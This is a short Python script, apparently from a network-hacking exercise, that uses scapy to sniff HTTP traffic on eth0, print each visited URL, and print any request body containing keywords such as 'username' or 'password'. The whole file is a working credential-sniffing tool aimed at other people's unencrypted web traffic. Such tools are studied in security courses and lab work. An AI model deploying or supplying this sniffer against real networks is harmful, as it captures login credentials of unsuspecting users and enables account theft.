#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=handle_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    load = str(packet[scapy.Raw].load)
    keywords = ["username", "Username", "user", "User", "login", "Login", "pass", "password", "Password"]
    for key in keywords:
        if key in load:
            return load


def handle_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] url is " + url.decode())
        if packet.haslayer(scapy.Raw):
            credentials = get_credentials(packet)
            if credentials:
                print("\n\n[+] potential sensitive data >>>>" + credentials + "\n\n")


sniff("eth0")
